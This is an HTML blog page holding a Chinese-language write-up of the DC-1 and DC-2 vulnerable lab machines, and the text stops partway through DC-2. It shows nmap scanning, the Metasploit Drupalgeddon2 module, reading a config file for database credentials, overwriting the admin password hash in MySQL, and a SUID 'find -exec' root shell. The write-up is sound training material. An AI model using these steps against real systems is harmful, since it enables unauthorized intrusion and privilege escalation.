@@ -1,0 +1,2770 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="DC-1 flag1 主机发现：arp-scan -l\n获取到IP后直接nmap扫描：\n1 nmap 192.168.80.155 发现打开了80端口，用浏览器可以打开网页\n接下来可以借助nmap扫描系统环境：\n">
+<title>2.5 DC靶场之综合渗透</title>
+
+<link rel='canonical' href='https://www.retr0.xyz/p/2.5-dc%E9%9D%B6%E5%9C%BA%E4%B9%8B%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/'>
+
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="2.5 DC靶场之综合渗透">
+<meta property='og:description' content="DC-1 flag1 主机发现：arp-scan -l\n获取到IP后直接nmap扫描：\n1 nmap 192.168.80.155 发现打开了80端口，用浏览器可以打开网页\n接下来可以借助nmap扫描系统环境：\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/2.5-dc%E9%9D%B6%E5%9C%BA%E4%B9%8B%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/'>
+<meta property='og:site_name' content='Retr0的小窝'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-02-05T17:36:57&#43;08:00'/><meta property='article:modified_time' content='2026-02-05T17:36:57&#43;08:00'/>
+<meta name="twitter:title" content="2.5 DC靶场之综合渗透">
+<meta name="twitter:description" content="DC-1 flag1 主机发现：arp-scan -l\n获取到IP后直接nmap扫描：\n1 nmap 192.168.80.155 发现打开了80端口，用浏览器可以打开网页\n接下来可以借助nmap扫描系统环境：\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+        <link rel="stylesheet" href="/css/APlayer.min.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_918ed7c4aecb3d05.gif" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😖</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Retr0的小窝</a></h1>
+            <h2 class="site-description">少女祈祷中……</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/349466985'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:ded000@retr0.xyz'
+                        target="_blank"
+                        title="email"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/makabaka11'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.retr0.xyz/index.xml'
+                        target="_blank"
+                        title="RSS"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-rss"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /><path d="M4 4a16 16 0 0 1 16 16" /><path d="M4 11a9 9 0 0 1 9 9" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://t.me/ded0000'
+                        target="_blank"
+                        title="Telegram"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-telegram"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页 | Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E-about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于 | About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档 | Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/message/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-message"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 9h8" /><path d="M8 13h6" /><path d="M18 4a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-5l-5 3v-3h-2a3 3 0 0 1 -3 -3v-8a3 3 0 0 1 3 -3h12z" /></svg>
+                
+                <span>留言板 | Msg Board</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索 | Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>技术链接 | Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#dc-1">DC-1</a>
+      <ol>
+        <li><a href="#flag1">flag1</a></li>
+        <li><a href="#flag2">flag2</a></li>
+        <li><a href="#flag3">flag3</a></li>
+        <li><a href="#flag4">flag4</a></li>
+        <li><a href="#final-flag">final-flag</a></li>
+        <li><a href="#拓展">拓展</a></li>
+      </ol>
+    </li>
+    <li><a href="#dc-2">DC-2</a>
+      <ol>
+        <li><a href="#flag1-1">flag1</a></li>
+        <li><a href="#flag2-1">flag2</a></li>
+        <li><a href="#flag3-1">flag3：</a></li>
+        <li><a href="#flag4-1">flag4</a></li>
+        <li><a href="#final-flag-1">final-flag</a></li>
+      </ol>
+    </li>
+    <li><a href="#dc-3">DC-3</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E5%AE%89/" style="background-color: #BEBDBD; color: #fff;">
+                网安
+            </a>
+        
+            <a href="/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/" >
+                26寒假集训
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2.5-dc%E9%9D%B6%E5%9C%BA%E4%B9%8B%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/">2.5 DC靶场之综合渗透</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+     
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-02-05 | 17:36</time>
+            </div>
+        
+
+        
+
+        
+        <div id="viewCount">
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
+            <time class="article-time--reading">
+                <span id="vercount_value_page_pv">loading... </span>次
+            </time>
+        </div>
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="dc-1">DC-1
+</h2><h3 id="flag1">flag1
+</h3><p>主机发现：<code>arp-scan -l</code></p>
+<p>获取到IP后直接nmap扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nmap 192.168.80.155
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现打开了80端口，用浏览器可以打开网页</p>
+<p>接下来可以借助nmap扫描系统环境：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nmap -O --osscan-guess 192.168.80.155
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以借助火狐的扩展插件：<code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;Wappalyzer&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，效果相同。</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/001.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>获取了足够的信息我们接下来使用msfconsole进行入侵。</p>
+<p><strong>注：因为笔者虚拟机里的MSF突然都寄了（恢复快照也不行）所以接下来部分用安卓终端Kali完成。</strong></p>
+<p>使用msf去搜索相关漏洞：</p>
+<p><code>msfconsole</code></p>
+<p><code>search Drupal</code></p>
+<p><code>use exploit/unix/webapp/drupal_drupalgeddon2</code></p>
+<p>中设置好目标RHOSTS后输入<code>run</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/002.jpeg"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>输入shell进入终端，</p>
+<p>执行ls，成功获取到flag1的位置</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/003.jpeg"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>使用cat查看即可。</p>
+<hr>
+<h3 id="flag2">flag2
+</h3><p>默认 drupal 配置文件位置为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">/var/www/sites/default/settings.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cat /var/www/sites/default/settings.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看到第二个 flag</p>
+<p>提示：暴力破解和字典攻击并不是获取访问权限的唯一途径（你需要访问权限），使用这些凭据，你可以做什么？</p>
+<p>并且给了我们数据库的用户名和密码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">dbuser/R0ck3t
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/004.jpeg"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<hr>
+<h3 id="flag3">flag3
+</h3><p>升级一下终端：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">python -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/005.jpeg"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>使用配置文件给的用户名和密码进mysql：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">mysql -udbuser -pR0ck3t
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>show databases;</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/006.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+选择drupaldb：<code>use drupaldb</code>;<br>
+查表：<code>show tables</code>;</p>
+<p>看到有一个叫做users的表，查具体信息：<code>select * from users;</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/007.jpeg"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>默认 drupal 的加密脚本位置在：</p>
+<p><code>/var/www/scripts/password-hash.sh</code></p>
+<p>我们可以自己加密生成一个密码 hash 值，然后替换进去，输入：<code>./scripts/password-hash.sh 123456</code></p>
+<p>回到 mysql 去更新 admin 的密码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">mysql -udbuser -pR0ck3t
+</span></span><span class="line"><span class="cl">use drupaldb;
+</span></span><span class="line"><span class="cl">update users set pass=&#39;$S$Dyt.gMokZZgE9tWWoSaB440Ydb2iSitXIuJOcWlWwArHw7FufACo&#39;where name=&#34;admin&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/008.jpeg"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>使用更新后的密码（123456）登录管理后台，在dashboard看到flag3</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/009.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>此处提示为：特殊的 SUID 权限可以帮助你通过 <code>find</code> 命令定位密码文件——但你需要利用该命令的 <code>-exec</code> 参数，才能想办法获取 <code>shadow</code> 文件中的加密内容。</p>
+<hr>
+<h3 id="flag4">flag4
+</h3><p>通过<code>cat /etc/passwd</code> 看到存在flag4用户</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/010.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>并且路径在<code>/home/flag4</code></p>
+<p><font style="color:rgb(0, 0, 0);">进入该目录，读取flag：</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/011.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>提示：使用同样的方法进入 root 目录找到 flag</p>
+<h3 id="final-flag">final-flag
+</h3><p>查找具有suid权限的文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">find / -perm -u=s -type f 2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现有find命令</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/012.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>查看root目录下面有什么文件：<code>find . -exec ls /root \;</code></p>
+<p><code>find LICENSE.txt -exec ls /root \;</code></p>
+<p>看到<code>thefinalflag.txt</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/013.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>使用cat命令读取：<code>find LICENSE.txt -exec cat /root/thefinalflag.txt \;</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/014.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<hr>
+<h3 id="拓展">拓展
+</h3><p>获取root权限的shell：<code>find LICENSE.txt -exec /bin/sh \;</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/015.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h2 id="dc-2">DC-2
+</h2><h3 id="flag1-1">flag1
+</h3><p>主机发现：<code>arp-scan -l</code></p>
+<p>nmap扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nmap -A 192.168.172.131
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开放了80端口，cms框架为WordPress 4.7.10。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/016.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>还可以继续全端口扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nmap 192.168.172.131 -p 1-65535
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现还开放了7744端口</p>
+<p>对7744端口进行强扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nmap 192.168.172.131 -p 7744 -A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现7744端口运行的是ssh服务</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/017.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>但是直接访问因为对方配置的域名是dc-2（并不是常规域名所以会解析失败），所以接下来要修改hosts文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">打开hosts文件：
+</span></span><span class="line"><span class="cl">vim /etc/hosts
+</span></span><span class="line"><span class="cl">添加：
+</span></span><span class="line"><span class="cl">192.168.172.131 dc-2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/018.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>再次访问，可以看到web页面，在右下角找到第一个flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/019.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>存在提示：</p>
+<p>提示：</p>
+<p><strong>你平时常用的那些字典可能派不上用场，所以，或许你只需要“酷”一点（暗指使用 CeWL 工具）。</strong></p>
+<p><strong>密码自然是多多益善，但有时你也没法一次性把它们全部搞定。</strong></p>
+<p><strong>先以其中一个身份登录去查看下一个 flag。如果在那儿没找到，就换另一个身份登录。</strong></p>
+<hr>
+<h3 id="flag2-1">flag2
+</h3><p>目录扫描，使用kali自带的工具</p>
+<p><code>dirb http://dc-2/</code></p>
+<p>当然如果你对wordpress比较熟悉可以直接访问：<code>http://dc-2/wp-admin/</code></p>
